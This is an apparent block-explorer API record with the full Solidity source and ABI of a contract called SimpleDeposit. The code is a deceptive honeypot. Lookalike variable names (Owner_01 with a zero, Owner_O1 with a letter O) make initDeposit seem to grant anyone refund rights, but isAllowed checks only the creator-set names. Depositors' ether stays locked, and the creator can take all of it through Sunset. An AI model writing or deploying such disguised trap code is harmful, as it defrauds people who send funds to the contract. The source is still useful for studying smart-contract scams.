{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.16;\r\n\r\ncontract Base \r\n{\r\n    address Creator = msg.sender;\r\n    address Owner_01 = msg.sender;\r\n\r\n    \r\n    event Deposited(address indexed sender, uint value);\r\n    \r\n    event Invested(address indexed sender, uint value);\r\n    \r\n    event Refunded(address indexed sender, uint value);\r\n    \r\n    event Withdrew(address indexed sender, uint value);\r\n    \r\n    event Log(string message);\r\n    \r\n    address Owner_02;\r\n    address Owner_03;\r\n    \r\n    function add(uint256 x, uint256 y) \r\n    internal \r\n    returns (uint256) \r\n    {\r\n        uint256 z = x + y;\r\n        if((z >= x) && (z >= y))\r\n        {\r\n          return z;\r\n        }\r\n        else\r\n        {\r\n            revert();\r\n        }\r\n    }\r\n\r\n    function sub(uint256 x, uint256 y) \r\n    internal \r\n    returns (uint256) \r\n    {\r\n        if(x >= y)\r\n        {\r\n           uint256 z = x - y;\r\n           return z;\r\n        }\r\n        else\r\n        {\r\n            revert();\r\n        }\r\n    }\r\n\r\n    function mul(uint256 x, uint256 y) \r\n    internal \r\n    returns (uint256) \r\n    {\r\n        uint256 z = x * y;\r\n        if((x == 0) || (z / x == y))\r\n        {\r\n            return z;\r\n        }\r\n        else\r\n        {\r\n            revert();\r\n        }\r\n    }\r\n    \r\n}\r\n\r\ncontract SimpleDeposit is Base\r\n{\r\n    struct Creditor\r\n    {\r\n        uint Time;\r\n        uint Invested;\r\n    }\r\n    \r\n    uint public TotalDeposited;\r\n    uint public Available;\r\n    uint public DepositorsQty;\r\n    uint public prcntRate = 10;\r\n    bool RefundEnabled;\r\n    \r\n    address Owner_O1;\r\n    \r\n    mapping (address => uint) public Depositors;\r\n    mapping (address => Creditor) public Creditors;\r\n    \r\n    \r\n    address Owner_O2;\r\n    address Owner_O3;\r\n    \r\n\r\n    function initDeposit()\r\n    {\r\n        Owner_O1 = msg.sender;\r\n    }\r\n    \r\n    function SetTrustee(address addr) \r\n    public \r\n    {\r\n        require((msg.sender == Owner_O2)||(msg.sender==Creator));\r\n        Owner_O2 = addr;\r\n    }\r\n    \r\n    function SetFund(address addr) \r\n    public \r\n    {\r\n        require((msg.sender == Owner_O2)||(msg.sender==Creator));\r\n        Owner_O3 = addr;\r\n    }\r\n    \r\n    function SetPrcntRate(uint val)\r\n    public\r\n    {\r\n        if(val>=1&&msg.sender==Creator)\r\n        {\r\n            prcntRate = val;  \r\n        }\r\n    }\r\n    \r\n    function() payable\r\n    {\r\n        Deposit();\r\n    }\r\n    \r\n    function Deposit() \r\n    public\r\n    payable\r\n    {\r\n        if(msg.value>= 0.5 ether)\r\n        {\r\n            if(Depositors[msg.sender]==0)DepositorsQty++;\r\n            Depositors[msg.sender]+=msg.value;\r\n            TotalDeposited+=msg.value;\r\n            Available+=msg.value;\r\n            Invested(msg.sender,msg.value);\r\n        }   \r\n    }\r\n    \r\n    function ToLend() \r\n    public \r\n    payable\r\n    {\r\n        Creditors[msg.sender].Time = now;\r\n        Creditors[msg.sender].Invested += msg.value;\r\n        Deposited(msg.sender,msg.value);\r\n    }\r\n    \r\n    function RefundDeposit(address _addr, uint _wei) \r\n    public \r\n    payable\r\n    {\r\n        if(Depositors[_addr]>0)\r\n        {\r\n            if(isAllowed())\r\n            {\r\n                _addr.send(_wei);\r\n                Available-=_wei;\r\n                Withdrew(_addr,_wei);\r\n                 \r\n            }\r\n        }\r\n    }\r\n    \r\n     function isAllowed()\r\n    private\r\n    constant \r\n    returns (bool)\r\n    {\r\n        return( msg.sender == Owner_01 || msg.sender == Owner_02 || msg.sender == Owner_03);\r\n    }\r\n    \r\n    function Sunset()\r\n    public\r\n    payable\r\n    {\r\n        if(msg.sender==Creator)\r\n        {\r\n            suicide(Creator);\r\n        }\r\n    }\r\n    \r\n    \r\n  \r\n}","ABI":"[{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"Depositors\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_addr\",\"type\":\"address\"},{\"name\":\"_wei\",\"type\":\"uint256\"}],\"name\":\"RefundDeposit\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"TotalDeposited\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"DepositorsQty\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"SetFund\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"initDeposit\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"val\",\"type\":\"uint256\"}],\"name\":\"SetPrcntRate\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"prcntRate\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"SetTrustee\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"ToLend\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"Available\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"Sunset\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"Creditors\",\"outputs\":[{\"name\":\"Time\",\"type\":\"uint256\"},{\"name\":\"Invested\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"Deposit\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Deposited\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Invested\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Refunded\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Withdrew\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"message\",\"type\":\"string\"}],\"name\":\"Log\",\"type\":\"event\"}]","ContractName":"SimpleDeposit","CompilerVersion":"v0.4.16+commit.d7661dd9","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://63c5176d3544d52a85a9bd01eeef1eff39fc26d45cc9ebbecb16aec25df718e8"}]}